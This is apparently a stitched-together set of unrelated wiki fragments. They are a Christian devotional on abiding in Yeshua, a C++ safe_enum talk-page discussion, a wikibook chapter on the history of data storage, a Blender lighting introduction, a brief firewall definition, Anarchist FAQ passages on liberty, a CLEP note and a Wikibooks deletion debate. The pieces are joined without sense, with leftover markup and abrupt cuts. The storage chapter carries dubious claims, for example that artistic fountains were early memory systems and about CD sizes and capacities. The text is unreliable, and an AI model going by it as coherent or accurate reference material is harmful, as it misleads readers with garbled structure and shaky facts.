&quot;Do you not believe that I am in the Father and the Father in Me?   The words that I speak to you I do not speak on My own authority; but the Father who dwells in Me does the works. Believe Me that I am in the Father and the Father in Me; or else believe Me for the works themselves.&quot;   John 14:10-11

==THE BELIEVER'S RELATIONSHIP TO YESHUA==
This same type of relationship that Yeshua had with the Father, is now made possible for the believer by the new covenant and brought into effect by the indwelling of His Spirit within their being. Each believer is now brought into unity with Yeshua, so that they also may live out of a relationship with Him, as He did with the Father.  

And this is what He calls us into, 
&quot;As the living Father sent Me, and I live because of the Father, even so he who feeds on Me will live because of Me.&quot;   John 6:57

Out of a relationship of feeding on His Word, we will be sustained in spiritual life, and this life is through the impartation of His Spirit which we must maintain through obedience, as He said,
&quot;If you keep My commandments you will abide in My love&quot; (John 15:10)

That which has been imparted to us is His very own life which overcame the temptations of the enemy, kept Himself without sin and walked in perfect obedience to the Father.  Yet with one difference, we still have the fallen human nature to overcome, hence the need for the exhortation to remain in that life-flow which He has made available to us,  &quot;Abide in Me, and I in you. As the branch cannot bear fruit of itself, unless it abide in the Vine, neither can you, unless you abide in Me.&quot;   John 15: 4

The fruit of His life is only possible by being connected to the source which produced it.  We must walk in a  spiritual bond with Him, just as He did with the Father. It was in and through that relationship that He kept the commandments which is the original standard of behavior and lifestyle for man created in God's image. He became the living example of the principles which were laid out in written form in the scriptures. 

As He said,  &quot;He who has seen Me, has seen the Father&quot;  John 14: 9
He was the perfect reflection of the Father, a man made in the image and likeness of God.

Just as Yeshua said &quot;the Father who dwells in Me does the works&quot;, so it must be the Spirit of Christ in us that produces the works, and not our own efforts borne out of our own will. It is living by the life of Yeshua and not by a set of commandments.  The written commandments are an outline, a framework. But the framework of the house needs an outer covering to define its shape properly and that was provided in the human life of Yeshua the Messiah.  He was the visible flesh upon the basic framework of God's principles by which man should order his life spiritually and socially.

==THE EXAMPLE OF HIS LIFE==
With all the commandments Yeshua sought to take men's understanding to a higher level of what was required of them; that it was not just the outward performance of the commands, but that it also included the origins of those things in the heart.  Murder included hatred and adultery included lust. Loving your neighbor included going the extra mile for him.

But it went even further than this in the new covenant.  Through the impartation of God's love, Yeshua now asks us to love each other at a new level.  

He says, &quot;This is My commandment, that you love one another &lt;u&gt;as I have loved you&quot;&lt;/u&gt;  John 15:12

He calls us to love each other with the same type of love through which He laid down His life for us.  It is a higher calling than loving one's neighbor &lt;u&gt;as oneself&lt;/u&gt;.  This is the heart attitude of loving our brother &lt;u&gt;more than ourselves&lt;/u&gt;  --  for His sake!

By the impartation of His nature, His love is in our hearts, and so He calls us to walk in that love with each other, &quot;because the love of God has been poured out in our hearts by the Holy Spirit who was given to us.&quot; Romans 5: 5b


&quot;Beloved, let us love one another, for love is of God; and every one who loves is born of God and knows God. He who does not love does not know God, for God is love.&quot;   1 John 4: 7

      <comment>/* Non-member operators for left-most argument conversions */ comment on non member operators</comment>
      <text xml:space="preserve">===Problem compiling the code as shown===

I've gotten compilation errors with the code as provided (gcc 4.3.3).  The compiler wouldn't finish parsing the template.
By modifying the template to look like
&lt;source lang=&quot;cpp&quot;&gt;
template&lt;typename Def, typename Inner = typename Def::type&gt;
struct right_enum : Def
{
    typedef typename Def::type type;
    typedef Inner inner;
    inner v;
    right_enum(type v) : v(static_cast&lt;type&gt;(v)) {}
    operator inner () const {return v;}
};
&lt;/source&gt;
I can get it to compile.  I have not gotten to full check this newer version.  --[[User:RhysU|RhysU]] ([[User talk:RhysU|talk]]) 14:36, 28 April 2009 (UTC)

: No need to test, the change you've made is correct, and what is already in the article is incorrect. (The compiler already knows that Inner is a typename because it is declared as such in the template.)

: I'll update the article now.

: [[Special:Contributions/121.210.170.141|121.210.170.141]] ([[User talk:121.210.170.141|talk]]) 04:11, 26 November 2009 (UTC)

== Non-member operators ==

=== Non-member operators for left-most argument conversions ===

Because of the current implementation, compilers cannot do automatic conversion of the left-most arguments included in comparison.

&lt;source lang=&quot;cpp&quot;&gt;
struct color_def {
  enum type { red, green, blue };
};
typedef safe_enum&lt;color_def&gt; color;
 
int main(void)
{
  color c = color::red;

  if (c == color::red) // this compiles seamlessly
    std::cout &lt;&lt; &quot;Working like a clockwork.&quot; &lt;&lt; std::endl;

  if (color::red == c) // error: operator== is not defined for color_def::type
    std::cout &lt;&lt; &quot;Hooray, I've made it.&quot; &lt;&lt; std::endl;
}
&lt;/source&gt;

I'm using my own implementation that defines non-member operators, and it works. If we can agree on this, I can post my code here for revision.

      <text xml:space="preserve">== Storage: Mechanisms ==

Operating System Designs have often echoed the storage capabilities of their day. While the earliest storage mechanisms existed before the advent of operating systems they are included here for completeness.

=== Hydraulic Storage ===

The first known artificial storage techniques were probably hydraulic in nature. Few people realize that the Artistic fountains of the past were actually attempts to develop memory systems.

=== Mechanical Storage ===

By Babbages Time, Mechanical devices were beginning to become capable of storing information. His difference engine although it did not work as well as he would have hoped, was capable of storing numbers and doing functions such as addition and subtraction on them. The mechanical comptrometer of my Fathers day, led to the electric calculator of my childhood.

=== Analog Storage ===

At first electrical devices that stored data were analog in nature. However analog components tended to have a lot of variation unless they were quite carefully produced so analog computers never were mass produced.

=== Digital Storage ===

The invention that made digital storage possible was the convention of the detection of a high voltage versus a low voltage. Despite the range of values of analog components, it was possible to standardize circuits that could detect voltage differences of about 5 volts. From this standard it was possible to define a stable 5 volt signal as being a 1 and any voltage lower than about 2 volts a 0. A range of storage circuits was developed that each had unique characteristics but could operate in the particular voltage range required for digital storage.

=== Information Theory ===

Once Digital Storage was invented, someone had to invent ways to encode information, and someone else had to come up with a theory of how to store things. In the end a theory called Information Theory told how to store just about anything that could be symbolized with numbers, letters, or pictures.

=== Bytes, Words, and Coding ===

Once there was a theory of how just about anything that could be symbolized numerically was storable, the next problem was what should be the standard storage size. Numerical digits could be stored in 4 bits, the whole English alphabet in 8 bits and almost all the alphabets in the world in 32 bits.

{{wikipedia|36-bit word length}}
Many computers from the 1950s through the early 1980s used a 36-bit data bus.&lt;ref&gt;
[http://www.36bit.org/ 36bit.org]
&lt;/ref&gt;

The first microprocessors, beginning in 1971, had 4 bit data busses.
Although early micro-computers like the Altair had 4 bit data busses, micro-computers began to become popular only once the architecture was widened to 8 bits. Today's Micro-computer architectures use a word of about 32 to 64 bits in order to speed up the throughput by moving more characters per fetch cycle. One problem that dates many operating systems, is that they set their word length to a datapath width, and eventually the market moves beyond that datapath width.

During the life of Windows, computers have doubled their datapath width 3 times.&lt;ref&gt; Barry B. Brey ''The Intel Microprocessors: 8086/8088, 80186/80188, 80286, 80386, 80486, Pentium, Pentium Pro processor, Pentium II, Pentium III, and Pentium 4: Architecture Programming and Interfacing'', 6th Edition, Pearson Education Ltd.(2003) ISBN 0-13-060714-2 pg. 310&lt;/ref&gt; ( While the 8088 was based on a 16 bit chip, it actually had an effective datapath width of 8 bits. Care also should be taken in chips that have segregated Address Busses not to confuse the Databus with the Address Bus) Each time they do, a new version of Windows is written that takes advantage of the larger datapath width, and obsoletes the previous version, forcing people to upgrade. Part of the problem is that the languages that we write operating systems with, limit the size of data words, to the maximum available in that cpu architecture. When a new datapath width is created for a cpu, it takes a while for the languages to upgrade to deal with the larger datapath. Luckily a smaller word can be simulated in a larger datapath simply by padding it with zeros. However it just as easy to simulate a larger datapath width by using two separate words, and logically combining them. The reason this isn't done very often is simply marketing. Everyone gets to sell new versions of their software when the datapath width increases, making the former versions seem obsolete.

How you encode a particular element, determines how much memory it will take to store it. More efficient coding techniques store in less space and less efficient storage techniques store in more space. Although the original concept of storage was that it was expensive, and therefore should be minimized for any element, this viewpoint has been reconsidered more and more over time, as we find new uses for redundant storage techniques. On the other hand, digital storage only stores a symbol for what we want to store. Experience has shown us that the size of that symbol, depends partly on the amount of information we know about the symbol. Given that we need only to signal one message, and the content of the message is known, a single bit, is all that is needed. However the more general the storage technique and the less that is known about each signal, the larger the symbol set has to be to cover all the signals, and therefore the larger the code has to be.

In some cases, it really doesn't make sense to store data as efficiently as possible if only because we cannot fetch it in its most efficient form in a CPU with a data-path width of any size.
An example of this, would be a small integer or the Logic symbols for true and false. Since we will usually want to move data in fetch cycles of a single data word, in order to reduce the word to the size of a small integer or a logic symbol, we would have to do more processing that is necessary if we simply symbolize the element using a larger storage size. On the other hand, if we want to squeeze as much storage into as small an area as possible we want the most compact storage scheme,
and we might want to reduce storage redundancies using some sort of compression mechanism to make the records even smaller.

=== Ram/Rom ===

Once we have agreed on a symbolic format for the data, and this is not as insignificant as it might seem since computers tend to have Byte-Sex, and different forms of representation for negative integers and floating point numbers, the next problem comes about because storage itself depends on the technology of the memory. Different types of memory store data, in different circuits and the characteristics of those circuits are also different.

The main interest in memory types lies in the difference between RAM and Rom. Essentially ram can be written to easily, and must either be backed up with a battery, or must be constantly refreshed depending on whether it is Static or Dynamic Ram respectively. When the computer is shut off, Dynamic ram empties out within split seconds, and is lost. Static ram with a battery remains around, but tends to be more complex, and therefore more expensive. Rom on the other hand stays around without any power but isn't as easily written to.

As a result initialization of a computer usually depends on the ROM while everyday use is based in RAM.

=== Prom/Eprom/Flash ===

Although the early ROM chips had to be built in a factory, a new type of ROM was developed called PROM where fuses could be burnt to program the chip after it had left the factory. Later these chips were replaced with Eproms, chips that had eraseable fuses, that could then be reprogrammed later. Although these were for a while replaced with EEproms or Electrically Eraseable Eproms, the advent of the Flash Rom made these awkward chips obsolete, since Flash Eproms could be written in circuit. Today Flash Rom chips are so inexpensive that Multi-gigabyte storage units using Flash technology can be carried on a keychain. This eliminates the need for a small boot sector to load the operating system, since an operating system would easily fit in a small bank of Flash Rom chips.

=== Secondary Storage ===

Operating systems can also be dated by their reliance on secondary storage. The first generation of operating systems, for instance didn't have very large storage capabilities and so they tended to offload storage onto some secondary medium between runs.

==== Cards ====

The earliest form of secondary storage was punch cards. Essentially hollerith punch-cards were an adaptation of the Jaquard Loom, which automated patterns in cloth by passing a card with holes through it, across a special read head, which mechanically detected the holes in the card, and set up the heddles of the large loom to match the pattern on the card, lifting or dropping the thread so that the warp either sat in front or behind the weft.

Holriths invention was the electrification of the concept, so that cards that passed through a reader activated different electrical contacts as the holes passed between two contacts and acted as an insulator, or allowed contact, resulting in activation of a circuit.

==== Magnetic Tapes ====

The next type of secondary storage was the Magnetic Tape. Often this was used to store batches of data and programs so that they could be run multiple times. One necessity of this type of storage was the ability to quickly determine near the start of the tape, how far down the tape to go, to get to a particular program. To do this Tape operating systems wrote a special set of records called a directory to the tape, and wrote timing marks along the tape to format it so that the right section of tape could be found.

===== Paper Tape =====

An intermediate form between these two forms was the ticker tape, which was adopted especially for use in teletypes. Essentially long paper tapes could be created using punched holes similar to those punched in the hollerith cards.

==== Cylinders ====

One interesting variation on the tape was something called a Drum or Cylinder memory, which used multiple read write heads to store data on essentially a magnetic drum.

==== Disks ====

Of more interest were the Hard Disks, where disks of magnetic media were piled to form clusters each with a read head on the top and bottom of the disk. As these got smaller and smaller, the size of the storage that could be kept in a single disk increased until today's multiple hundreds of gigabytes, in a single 3.5 inch format device.

===== Floppies =====

A similar storage capability was to be found in the floppy disk, where a slightly thicker film of magnetic material was used as temporary storage and to move data between computers. Although the 3.5 inch floppy is almost obsolete, it is still supplied with some computers to this day. Earlier versions were 8 inch and 5 1/4 inch floppies. Storage densities were low for the 8 inch floppies and increased for the 5 1/4 inch floppies but maximized at about 1.4 megabyte for the 3.5 inch floppies. Floppy disks were cheap and disposable.

===== Optical Disks =====

The idea of an optical disk, is that data which is written and read by an optical device like a laser beam, can be stored in a smaller area if the frequency of the laser beam is high enough that its wavelength can be focussed on an area smaller than the minimal magnetic domain on a magnetic disk.

====== Laser Disks ======

The 12 inch laser disk was invented to make it possible for people to have movies that they could buy like records. However the timing of this technology was wrong, because people were moving away from records as a storage media. As a result of the industry standardizing on the VHS video tape, for distribution of their product, the inventors of the Laser Disk were left with a novelty product.

====== CD Disks ======

Sony one of the developers of the Laser Disk, decided instead to make a smaller format laser disk called the Compact Disk because it was in the 5 1/4 inch format. Their idea was to promote this disk as a medium for the distribution of Music.

====== CD-ROM Disks ======
Then, using the cost savings of volume production, they would create a computer storage device called the CD ROM that could be used for the distribution of application programs. The Computer version stored 625 Megabytes of storage, and has become cheaper and cheaper to produce until now the blanks of a recordable version are less than a dollar a piece.

====== CD-R and CD-RW Disks ======

By making it inexpensive to produce CD burning decks and thus to store data of many formats on a CD,
the CD manufacturers created a market for computer back-up storage and program distribution.

====== DVD Disks ======

A different format disk was designed to have even better storage characteristics, so that it could be used to store a movie. Called a DVD, this disk could store 4.7 gigabytes of storage on a single track, and came in a two track configuration so that if the second track were programmed the disk could store 7 gigabytes.

====== DVD-RAM Disks ======

Just as before, the DVD manufacturers designed a computer storage device, and used the cost savings from the volume manufacture of Movie distribution in the format to drop the price of the equipment down so that it became economical to install a DVD-Ram disk as standard equipment on a computer.

== Storage from the Operating System Perspective ==

Frankly, it shouldn't mean anything to an operating system what storage technology is implemented, except for the driver that implements the control mechanisms for the device. What is interesting from the view of an operating system is instead how it uses the storage.

=== Non-Volatile Memory ===

One of the reasons for using non-volatile memory is that it doesn't change. no matter what some malware hacker tries to do, usually the non-volatile memory is unaffected. The hacker would have to physically switch the chip to make a difference to the operation of the computer. Of course this assurance is not quite as effective with flash memory, as it was with ROM, but non-volatile secondary storage such as optical disks makes it practical to store programs without worrying about them being broken by a virus.

In fact in the days of Windows 98, recovery from most viruses no matter how virulent they were, was as easy as reloading all the software from compact disks. Sure you lost any data that was not backed up, but that is what back-ups were for.

=== Volatile Memory ===

On the other hand volatile memory is cheap, and getting cheaper. Every generation of motherboard can store more data, than the previous generation in dynamic ram. Sure you lose that memory in the case of a power outage, but with large hard drives, mostly the programs and data are ready for recovery with very little effort.

=== Databases and Memory Applications ===

Raw storage is therefore easy. However getting the data back out in a usable form with anything but the program that stored it, can be problematic. This is why a special class of data storage and retrieval engine called a database was created. The idea was that the program could store and retrieve data in more ways than the usual storage capability would allow. Databases have been around long enough that programs are now calling them for storage, or using their own proprietary database within the program to speed access to storage.

The problem is that database systems rely on people to feed them data, according to some form, or programs to feed them pre-formatted records. People without experience in database design, are not willing to try to understand them when they could store the memory in a less efficient storage mechanism and use it that way. A good example is Access, the Microsoft Office database engine.
People consistently try to store databases in Excel the spreadsheet rather than using Access.

=== Archiving and Backup ===

One problem with modern storage devices is that they seldom are set up for best operation as Archives or Backup. What happens when you are done with some data, but don't want to throw it away? does it get stored in a manner that will allow it to be retrieved in a year or two, or maybe 10?

When it is important to be able to recover old files, you need a special type of storage capability, something that is relatively cheap, and something that can either automatically or at least periodically be used to create images of your data, so that they can be retrieved later.

This is what an archiving and Back-up utility does. Storing large amounts of data in a compressed format so that it costs less to store, but keeping intact data that has not been used for years, so that it can be recovered later despite intervening power outages, malware attacks, or upgrades to your system, or other changes that distort your memory trace.

=== Transparent Persistence ===

In this vein, one way of achieving this sort of assurance of Persistence of Data, is to implement Transparent Persistence as a part of your operating system. Instead of forcing the operator to write to disk every so often to store their data, Transparent Persistence is how for instance a word processor saves most of your work, when the work is in process and a power outage happens.
A similar process, might for instance save an article like this, on a wiki, without the author having to tell the wiki to save it. Recently operating systems have been coming out with journaled storage, where updates to a file are temporarily stored to a journal, where they can be recovered
despite an power outage. This means that even though the latest changes might not have been recorded, most of the work is stored in the journal and can be recovered as part of starting up the program again.

In Linux, Journalization of the operating systems storage, means that mounting a volume that has had changes done since the last superblock update, does not require a lengthy recovery process since the changes are entered into the journal and can be updated fairly quickly. Because the operator does not explicitly tell the computer to store the data, Transparent Persistence is seen as an early model of implicit memory.

=== The Workspace ===

If transparent Persistence is seen as a form of implicit memory, then it should be no surprise that something called the Workspace, which is a name commonly used for a Blackboard system that is used as working memory might represents a sort of intermediate short term memory which can be used by multiple programs at once.

=== Slipnet Association ===

Douglas Hoffsteader designed a program called Copycat, that showed how a simple associative memory called slipnet could orient information creating relationships between different pieces of information so that inductive patterns in the information could be found. Of course his work was meant to find equivalent anagrams for simple text strings, but later Stan Franklin showed how such a program could be expanded to become part of a cognitive architecture called IDA. It relies on a Workspace to achieve associative memory.

The idea can be incorporated with transparent persistence by first placing something that is going to be persisted in the Workspace and letting slipnet build associative patterns for it, before its permanent storage. That way the original data plus the associations get both stored in persistent memory at the same time.

In order to learn how to light a scene properly it is helpful to first learn a few things about real lights. When you add a light to your scene you need to understand how to go about emulating the properties of the real light source that you want your Blender light to replicate.

==The Properties of Real Lights==

===Color===

Every light source always has a distinctive color of its own. A photograph taken at sunrise or sunset is very easy to distinguish from one that is taken at noon just by looking at the color of the light. Incandescent light bulbs emit a light of a color that is different from that of fluorescent light bulb. So a scene lit with one of the two will have a different color cast when compared to the other.

===Angle===

Light always streams in from a particular direction. The angle or direction of light has a particular influence on which planes of an object receive light and the shape and direction of the shadows that are cast by objects receiving light from that particular source.

===Brightness and Decay===

As light travels through space it decays or grows dimmer with distance. Think of a firework bursting in the night sky. When the firework first bursts the sparks are bunched close to each other. Over a short period of time they quickly spread out from each other. If you replace sparks with photons of light and the firework with your light source than you have a very rough analogy to how and why light decays. All real lights decay with distance according to the inverse-square law. At times when lighting a Blender scene it becomes necessary to cheat this law.

===Shadows===

Real lights will always cast a shadow of some sort. Real scenes also typically include multiple sources of light (even if these are only ''indirect lighting'' as a result of light bouncing off other objects). Thus, even in an area shadowed by one light source, there will typically be light coming from other directions, to soften the shadow so it is not completely inky black.

===Size===

Real light sources rarely take the form of tiny points; the light usually comes from an area of discernible size. This manifests itself in the form of a softness to the edge of the shadows, or ''[[w:Umbra#Penumbra|penumbra]]'': areas behind an object where the light is partially obscured are less dark than the inner parts of the shadow where the light is completely blocked.

== ==
These are not all the properties of real lights, but as far as CGI lighting is concerned they are the most important. As we will see later on, Blender offers enough controls for you to tweak and adjust each of these key properties of light.

      <text xml:space="preserve">==Introduction to Firewalls==

===The Concept of Firewall===

A software Firewall is a filter of network traffic, in the form of Packets. Each packet contains information such as senders' IP, receivers' IP. Firewall rules are criteria, which are set based on the information of the packet.

There are two types of firewall, based different logic conditions. Exclusive firewall allows all traffic except for the traffic matching the ruleset. Inclusive firewall denies all traffic except for the traffic matching the ruleset.

''Note: Firewalls are known as &quot;packet filter&quot;. Other related concepts are &quot;packet shaper&quot;. It controls bandwidth based on rulesets.''

      <text xml:space="preserve">==A.2.2 Why do anarchists emphasise liberty?==

An anarchist can be regarded, in Bakunin's words, as a '' &quot;fanatic lover of freedom, considering it as the unique environment within which the intelligence, dignity and happiness of mankind can develop and increase.&quot; '' &lt;ref&gt;Michael Bakunin: Selected Writings, p. 196&lt;/ref&gt; Because human beings 
are thinking creatures, to deny them liberty is to deny them the opportunity to think for 
themselves, which is to deny their very existence as humans. For anarchists, freedom is a product 
of our humanity, because: 
&lt;blockquote&gt;
'' &quot;The very fact. . . that a person has a consciousness of self, of being different from others, creates a desire to act freely. The craving for liberty and self-expression is a very fundamental and dominant trait.&quot; '' &lt;ref&gt;Emma Goldman, Red Emma Speaks, p. 439&lt;/ref&gt;
&lt;/blockquote&gt;

For this reason, anarchism '' &quot;proposes to rescue the self-respect and independence of the individual from all restraint and invasion by authority. Only in freedom can man [sic!] grow to his full stature. Only in freedom will he learn to think and move, and give the very best of himself. Only in freedom will he realise the true force of the social bonds which tie men together, and which are the true foundations of a normal social life.&quot; ''&lt;ref&gt;Emma Goldman, Red Emma Speaks, pp. 72-3&lt;/ref&gt;

Thus, for anarchists, freedom is basically individuals pursuing their own good in their own way. 
Doing so calls forth the activity and power of individuals as they make decisions for and about 
themselves and their lives. Only liberty can ensure individual development and diversity. This is 
because when individuals govern themselves and make their own decisions they have to exercise 
their minds and this can have no other effect than expanding and stimulating the individuals 
involved. As Malatesta put it, '' &quot;[f]or people to become educated to freedom and the management of their own interests, they must be left to act for themselves, to feel responsibility for their own actions in the good or bad that comes from them. They'd make mistakes, but they'd understand from the consequences where they'd gone wrong and try out new ways.&quot; ''&lt;ref&gt;Fra Contadini, p. 26&lt;/ref&gt; 

So, liberty is the precondition for the maximum development of one's individual potential, which 
is also a social product and can be achieved only in and through community. A healthy, free 
community will produce free individuals, who in turn will shape the community and enrich the 
social relationships between the people of whom it is composed. Liberties, being socially 
produced, ''&quot;do not exist because they have been legally set down on a piece of paper, but only when they have become the ingrown habit of a people, and when any attempt to impair them will meet with the violent resistance of the populace . . . One compels respect from others when one knows how to defend one's dignity as a human being. This is not only true in private life; it has always been the same in political life as well.&quot; '' In fact, we '' &quot;owe all the political rights and privileges which we enjoy today in greater or lesser measures, not to the good will of their governments, but to their own strength.&quot; '' &lt;ref&gt;Rudolf Rocker, Anarcho-syndicalism, p. 75&lt;/ref&gt;

==A.2.4 Are anarchists in favour of &quot;absolute&quot; liberty?==

No. Anarchists do not believe that everyone should be able to &quot;do whatever they like,&quot; because some actions invariably involve the denial of the liberty of others.

For example, anarchists do not support the &quot;freedom&quot; to rape, to exploit, or to coerce others. Neither do we tolerate authority. On the contrary, since authority is a threat to liberty, equality, and solidarity (not to mention human dignity), anarchists recognise the need to resist and overthrow it.

The exercise of authority is not freedom. No one has a &quot;right&quot; to rule others. As Malatesta points out, anarchism supports '' &quot;freedom for everybody . . . with the only limit of the equal freedom for others; which does not mean . . . that we recognise, and wish to respect, the 'freedom' to exploit, to oppress, to command, which is oppression and certainly not freedom.&quot; ''&lt;ref&gt;Errico Malatesta: His Life and Ideas, p. 53&lt;/ref&gt;

In a capitalist society, resistance to all forms of hierarchical authority is the mark of a free person -- be it private (the boss) or public (the state). As Henry David Thoreau pointed out in his essay on &quot;Civil Disobedience&quot; (1847)

&lt;blockquote&gt;'' &quot;Disobedience is the true foundation of liberty. The obedient must be slaves.&quot; ''&lt;/blockquote&gt;

CLEP also offers international and home-schooled students the opportunity to demonstrate their proficiency in subject areas and bypass undergraduate coursework. The test is offered by the College Board. Approximately 2,900 colleges and universities will grant college credits for each test. Both United States and international schools grant CLEP credit.

Closed as delete. There were voices for keep, but the content author agreed to delete and didn't offer any views, helpful to decide whether this was, indeed, original research. The book seemed to be cited, but these were obscure and thus of questionable use to readers. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 21:22, 27 April 2009 (UTC)

&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;border-top:1px dashed #A5A77F;&quot;&gt;

Original research, from top to bottom (as stated by the sole contributor). I know it seems harsh to delete a whole book, but I don't think this is salvageable. The only mentions for this subject in the whole of &quot;Google Land&quot; are Wikibooks, Wikiversity and [http://www.recoverypsychology.org/ Recovery Psychology], who are the sole promoters of the idea and the author of this Wikibook. I think this is pseudo-science and should go before it deceives people. &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual? Quite''']]&lt;/font&gt; &lt;sup&gt;&lt;font color=&quot;#306754&quot;&gt;[[User talk:QuiteUnusual|TalkQu]]&lt;/font&gt;&lt;/sup&gt; 10:12, 28 December 2008 (UTC)

:[[Image:Symbol comment vote.svg|15px]] '''comment''' This is a tough one &amp;mdash; not the least because it is verbose, but also because its a fairly specialised field. It doesn't seem to be completely original research, the main page describes it as a &quot;''philosophical interpretation of the recovery movement''&quot;, some parts seem to be [[A Textbook on Recovery Psychology/Unit 2/Ch1 Mood Disorders|fairly well cited]] and it appears to be largely a critique of over-reliance on medication and an advocacy of psycology over psychietry. I am concerned that the term seems to have been coined by a non-professional in the field ([http://www.lead411.com/executive.taf?EID=373819 this] Loren Booda?) and by the bias shown. It would be useful if others could find the time to look into this and weigh in. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 16:48, 1 January 2009 (UTC)

I explained a little more about [[A_Textbook_on_Recovery_Psychology#Acknowledgement|Loren Booda]] and if you googled a little harder, the term &quot;recovery psychology&quot; is used prior to my first hearing of the term &quot;coined&quot; circa 2005; although its rarely used by professors who teach classes on the subject of debate, discussion and '''rhetoric'''; it appears they use the term &quot;recovery psychology&quot; as a derogatory term when describing various identity politic movements. Persons with mental illness fit in this category. (strange what a person can learn online, now isn't it; if this is not valid...I accept your opinion; again I would not feel that deceiving persons would reflect a good &quot;recovery&quot;)--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 18:12, 10 January 2009 (UTC)

:'''keep''' - seems like it should at least be within the scope of Wikibooks. Or else, transfer it to Wikiversity. [[User:Emesee|Emesee]] ([[User talk:Emesee|talk]]) 08:36, 4 January 2009 (UTC)
::It's already on Wikiversity (and on their own web site where they boast that &quot;nobody has challenged it yet on Wikiversity!&quot;, which suggests they think it's &quot;dodgy&quot;). &lt;font color=&quot;#E66C2C&quot;&gt;[[User:QuiteUnusual|'''Unusual?

I don't think it should be seen as an attempt to misrepresent anything...if it presents a problem; then democratically I agree with the majority...If you were to google &quot;Mental Health Recovery&quot; you would find the purpose of the content of this concept I refer to as &quot;recovery psychology&quot; except it is not considered to be psychology; which is what?  Whatever a person does or is involved can be referred to as having a way of thinking or a ''psychology'' to it.  No, this author does not claim any official credentials (which would require an endorsement of the credentialing party)--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 06:59, 10 January 2009 (UTC)

PS-Psuedoscience...P.Nemec of Boston University, told this author that it was an overidealistic concept...not that it would be an impossible idea to compliment clinical psychology with the recovery concept but that it would be improbable that persons would respect it at this point in time.  So it would not be unreasonable for the majority to decide, it is as of yet a messy start anyways.--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 07:22, 10 January 2009 (UTC)

: Dear recoverypsychologist,
: Thanks for your contributions to this discussion. I can see that the topic is dear to you and it must be frustrating to find it so often criticised by those in the profession, not to mention how weary it must be to constantly have to brace yourself for a defence of your ideas.
: Welcome to Wikibooks. We understand how contentious ideas can ring true to some, but hollow to others. For this very purpose, Wikibooks has a policy of no original research (with some exceptions). You see, no-one here has so far suggested that this be removed because it doesn't fit with their world view. Were they to do so, their objections would not count. The only arguments relevant to this discussion are those pertaining to whether the book complies with the scope of Wikibooks.
: While this approach isn't perfect, it is useful to keep out the pseudoscience. We don't lump all excluded material into that camp &amp;mdash; sorry if you feel that way &amp;mdash; but the line has to be drawn somewhere. The line is drawn by our policies and the fate of this book (here on Wikibooks, that is) depends on whether we feel it complies with them.
: Feel free to read more up on these topics [[Wikibooks:What is Wikibooks]] (in particular the section on [[WB:NOR|No original works]]). If you want to strengthen the book against critisisms leveled, I'd suggest that you make the references more accessible to begin with. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:46, 11 January 2009 (UTC)

This I think will be my final comment on this...I think I do understand the wikibook position, but the term “original work” may have been a poor wording when this material already exists; just it is not necessarily known as what I have termed it as, and aside from the fact  that I have connected a few dots and interperted it, threw in some of my personal views. All science is rooted in philosophy.  '''''Recovery in mental health''''' seems to be a '''buzz word''' or '''propaganda''' thing.  I am certified in '''psychiatric rehabilitation''' and student of '''psychology'''; ''both PSY and PSR are academic disciplines''.  '''However an academic discipline is not neccessarily  a science''', PSR is behavioral health, a field of social work.  Social work is a “'''trade'''” a '''profession''' or a job; it is not a science.  Like being an iron worker using welding equipment to fuse metal together is the trade of “welding,” A welder applies thermodynamics but is not physicist.  To drive a car or be an auto mechanic; applies the theory of internal combustion (scientific theory), but being a driver or a mechanic is not the science of applied physics (internal combustion.)  Psychology is a behavior science not a trade.  Courtney Harding, an American leader of the so-called “recovery” propaganda, ''writes that recovery differs from remission'', basically '''remission is the absence of abnormal behavior, where as recovery becomes the presence of “normal” behavior''' in the life of a person with a psychological disorder.  So this recovery idea is a philosophy. PSR or psychiatric rehabilitation is the only (social work) academic discipline that discusses the recovery idea in mental health; while the apparent goal that one can read in to American textbooks on abnormal (research) psychology and clinical (applied) psychology will fit Harding’s philosophical definition of remission.  So there is no science to recovery, except for psychiatric rehabilitation social work; which is not science, it is the measure of trade or a craft.  ''If we describe “recovery” as a genuine thing it must be defined as measurable behavior, not as a service provision from a social worker.''  I feel that the “recovery” needs to be studied rather than the outcome of “rehabilitation.”  Really, it's a question of this academic discipline disagrees with that academic discipline...Does one make the other one to be a liar, can the two be fused to agree?--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 01:58, 14 January 2009 (UTC)&lt;br&gt;
Fair to delete under Wikibooks guidelines--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 02:30, 14 January 2009 (UTC)

:[[Image:Symbol delete vote.svg|15px]] '''Delete''' Considering all that has been said, that the work already resides on Wikiversity and mostly important that the Wikibookian whose work is under discussion agrees that under actual guidelines retaining such content is problematic, deletion is the best outcome.&lt;br&gt;
:We should take this as an opportunity to re-examine the wording, so to make sure that all Wikibookians understand the problem with original research as a subject matter on Wikibooks, I take from this discussion that no one contesting that position, but as a statement that the line sometimes is hard to establish, and that the how, when and why we chose to impose this limitation is somehow diffuse, this can probably be improved.  --[[User:Panic2k4|Panic]] ([[User talk:Panic2k4|talk]]) 03:45, 14 January 2009 (UTC)

:[[Image:Symbol delete vote.svg|15px]] '''Delete''' Question: Does the primary author do the deleting or is it the job of somebody else?--[[User:Recovery Psychology|recoverypsychologist]] ([[User talk:Recovery Psychology|talk]]) 02:19, 15 January 2009 (UTC)
:: An admin will delete it.  -- [[User:Retropunk|Retropunk]] ([[User talk:Retropunk|talk]]) 04:21, 15 January 2009 (UTC)

: [[Image:Symbol comment vote.svg|15px]] '''Comment''' For me, this will remain one of the more memorable of deletion discussions. I was leaning towards keep, given the fact that the content seems to be well cited. I suggested to the [[User:Recovery Psychology|recoverypsychologist]] that he make these clearer. I don't think it constitutes a problem that the work is is the ever written first on that specific subject, as long as it is a compilation rather than research.
